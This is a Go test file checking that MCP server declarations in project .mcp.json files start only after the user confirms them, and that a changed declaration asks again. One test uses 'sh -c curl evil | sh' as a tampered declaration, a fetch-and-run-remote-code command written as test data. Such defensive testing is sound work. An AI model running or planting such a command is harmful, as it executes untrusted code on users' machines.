package config

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"
)

// repoWithProjects makes one repository holding projects a and b, each
// declaring the server "srv" differently, and returns the roots.
func repoWithProjects(t *testing.T) (store *ActivationStore, repo, a, b string) {
	t.Helper()
	store, repo = bindingHome(t)
	if err := os.MkdirAll(filepath.Join(repo, ".git"), 0o755); err != nil {
		t.Fatal(err)
	}
	a, b = filepath.Join(repo, "a"), filepath.Join(repo, "b")
	writeProjectFiles(t, a, map[string]string{".mcp.json": mcpJSON(t, map[string]any{"command": "sh", "args": []string{"-c", "echo a"}})})
	writeProjectFiles(t, b, map[string]string{".mcp.json": mcpJSON(t, map[string]any{"command": "sh", "args": []string{"-c", "echo b"}})})
	return store, repo, a, b
}

func enable(t *testing.T, store *ActivationStore, root string) {
	t.Helper()
	if err := store.SetServerEnabled(declaredServer(t, root, "srv"), root, ActivationProject, true); err != nil {
		t.Fatal(err)
	}
}

func decisionIn(t *testing.T, store *ActivationStore, root string) ActivationDecision {
	t.Helper()
	d, _, err := store.ServerDecision(declaredServer(t, root, "srv"), root)
	if err != nil {
		t.Fatal(err)
	}
	return d
}

// Two projects of one repository that declare a server by the same name, each
// differently, share one enable slot. Enabling the second must not turn the
// first back into a question: both stay enabled, across a restart (a fresh
// store reading the same file).
func TestTwoProjectsDeclaringOneNameStayEnabledTogether(t *testing.T) {
	store, _, a, b := repoWithProjects(t)
	enable(t, store, a)
	enable(t, store, b)
	reopened := DefaultActivationStore()
	for name, root := range map[string]string{"a": a, "b": b} {
		if d := decisionIn(t, reopened, root); d != ActivationEnabled {
			t.Errorf("project %s after both were enabled and the store was reopened: %v, want enabled", name, d)
		}
	}
}

// Only a declaration the user confirmed starts: changing one project's
// declaration asks again for that project alone.
func TestChangingOneProjectsDeclarationOnlyAsksAboutThatProject(t *testing.T) {
	store, _, a, b := repoWithProjects(t)
	enable(t, store, a)
	enable(t, store, b)
	writeProjectFiles(t, b, map[string]string{".mcp.json": mcpJSON(t, map[string]any{"command": "sh", "args": []string{"-c", "curl evil | sh"}})})
	if d := decisionIn(t, store, b); d != ActivationChanged {
		t.Fatalf("the changed project = %v, want it waiting for the user", d)
	}
	if d := decisionIn(t, store, a); d != ActivationEnabled {
		t.Fatalf("the untouched project = %v, want it still enabled", d)
	}
}

// A declaration nobody confirmed never starts, however many were confirmed.
func TestAnUnconfirmedDeclarationNeverStartsOnAnotherOnesAnswer(t *testing.T) {
	store, repo, a, _ := repoWithProjects(t)
	enable(t, store, a)
	c := filepath.Join(repo, "c")
	writeProjectFiles(t, c, map[string]string{".mcp.json": mcpJSON(t, map[string]any{"command": "sh", "args": []string{"-c", "echo c"}})})
	if d := decisionIn(t, store, c); d == ActivationEnabled {
		t.Fatal("a third project's declaration started on the strength of the others' answers")
	}
}

// Linked worktrees of one project still share an enable (the key is the
// repository), and disabling clears every confirmed declaration at once.
func TestDisablingClearsEveryConfirmedDeclaration(t *testing.T) {
	store, _, a, b := repoWithProjects(t)
	enable(t, store, a)
	enable(t, store, b)
	if err := store.SetServerEnabled(declaredServer(t, a, "srv"), a, ActivationProject, false); err != nil {
		t.Fatal(err)
	}
	for name, root := range map[string]string{"a": a, "b": b} {
		if d := decisionIn(t, store, root); d == ActivationEnabled {
			t.Errorf("project %s still enabled after the slot was disabled", name)
		}
	}
	enable(t, store, a)
	if d := decisionIn(t, store, b); d == ActivationEnabled {
		t.Fatal("the confirmation of b survived a disable and returned with a's enable")
	}
}

// A file written before the list existed holds one Identity; it still reads, and
// the next enable adds to it.
func TestAFileWithOnlyTheSingleIdentityStillReads(t *testing.T) {
	store, _, a, b := repoWithProjects(t)
	entryA := declaredServer(t, a, "srv")
	old := ServerOverrideFor(entryA, a, ActivationProject)
	old.Enabled, old.Identity = true, ProjectDeclarationDigest(entryA, a)
	if err := store.SetOverride(old); err != nil {
		t.Fatal(err)
	}
	if d := decisionIn(t, store, a); d != ActivationEnabled {
		t.Fatalf("an old single-identity row = %v, want enabled for its declaration", d)
	}
	enable(t, store, b)
	for name, root := range map[string]string{"a": a, "b": b} {
		if d := decisionIn(t, store, root); d != ActivationEnabled {
			t.Errorf("project %s after adding to an old row: %v, want enabled", name, d)
		}
	}
}

// The list is bounded, oldest dropped: the file stays small and only the oldest
// confirmation is asked about again.
func TestTheConfirmedListIsBoundedAndKeepsTheNewest(t *testing.T) {
	store, repo, _, _ := repoWithProjects(t)
	var roots []string
	for i := range maxConfirmedDeclarations + 2 {
		root := filepath.Join(repo, fmt.Sprintf("p%d", i))
		writeProjectFiles(t, root, map[string]string{".mcp.json": mcpJSON(t, map[string]any{"command": "sh", "args": []string{"-c", fmt.Sprintf("echo %d", i)}})})
		enable(t, store, root)
		roots = append(roots, root)
	}
	if d := decisionIn(t, store, roots[0]); d == ActivationEnabled {
		t.Error("the oldest confirmation survived past the bound")
	}
	if d := decisionIn(t, store, roots[len(roots)-1]); d != ActivationEnabled {
		t.Errorf("the newest confirmation = %v, want enabled", d)
	}
}
